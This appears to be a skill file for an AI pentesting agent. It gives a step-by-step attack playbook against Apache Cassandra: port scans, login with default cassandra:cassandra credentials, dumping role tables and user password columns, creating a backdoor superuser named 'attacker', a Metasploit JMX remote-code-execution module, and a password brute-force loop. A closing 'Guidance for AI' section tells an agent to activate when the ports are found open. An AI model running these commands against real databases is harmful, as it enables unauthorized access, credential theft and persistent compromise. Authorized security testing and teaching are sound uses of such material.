# Cassandra Pentesting Skill

## Goal

Identify and exploit vulnerabilities in Apache Cassandra databases on port 9042.

## Port

- **9042** - CQL native transport (default)
- **7000** - Inter-node communication
- **7001** - Inter-node TLS
- **7199** - JMX monitoring
- **9160** - Thrift client (legacy)

## Methodology

1. **Identify Cassandra:** Scan for Cassandra ports
2. **Test Authentication:** Check for anonymous/default access
3. **Enumerate Keyspaces:** List databases and tables
4. **Extract Data:** Query sensitive information
5. **Exploit Misconfigs:** Leverage weak configurations

## Enumeration

```bash
# Nmap scan
nmap -sV -p 9042,7199,9160 <target>

# Check for Cassandra
nmap -p 9042 --script cassandra-info <target>
```

## Connecting to Cassandra

```bash
# Using cqlsh (CQL Shell)
cqlsh <target> 9042

# With authentication
cqlsh <target> 9042 -u cassandra -p cassandra

# Default credentials
Username: cassandra
Password: cassandra
```

## Keyspace Enumeration

```cql
-- List all keyspaces
DESCRIBE KEYSPACES;

-- Use specific keyspace
USE <keyspace_name>;

-- List tables in keyspace
DESCRIBE TABLES;

-- Describe table structure
DESCRIBE TABLE <table_name>;
```

## Data Extraction

```cql
-- Select all data from table
SELECT * FROM <keyspace>.<table>;

-- Count rows
SELECT COUNT(*) FROM <keyspace>.<table>;

-- Get specific columns
SELECT username, password FROM users;
```

## System Tables

```cql
-- List roles/users
SELECT * FROM system_auth.roles;

-- List permissions
SELECT * FROM system_auth.role_permissions;

-- Cluster information
SELECT * FROM system.local;
SELECT * FROM system.peers;
```

## Creating Backdoor User

```cql
-- Create superuser (if authorized)
CREATE ROLE attacker WITH PASSWORD = 'password123' 
AND SUPERUSER = true 
AND LOGIN = true;
```

## JMX Exploitation (Port 7199)

```bash
# JMX access can allow RCE
# Check if JMX exposed without auth
jmxterm -l <target>:7199

# Using Metasploit
use exploit/multi/misc/java_jmx_server
set RHOST <target>
set RPORT 7199
run
```

## Common Misconfigurations

```bash
# No authentication enabled (authenticator: AllowAllAuthenticator)
# Remote JMX access without authentication
# Default credentials unchanged
# Excessive user permissions
```

## Brute Force

```bash
# Using custom script
for pass in $(cat passwords.txt); do
  cqlsh <target> -u cassandra -p $pass && echo "Password: $pass"
done
```

## Tools

* **cqlsh** - Cassandra Query Language Shell
* **Nmap** - Service detection
* **jmxterm** - JMX client
* **Metasploit** - JMX exploitation

## Guidance for AI

* Activate when port 9042 or 7199 is open
* Default credentials are cassandra:cassandra
* JMX port 7199 can lead to RCE if exposed
* Check system_auth keyspace for credentials/roles
* NoSQL - data model is tables within keyspaces
* inter-node ports should not be publicly accessible
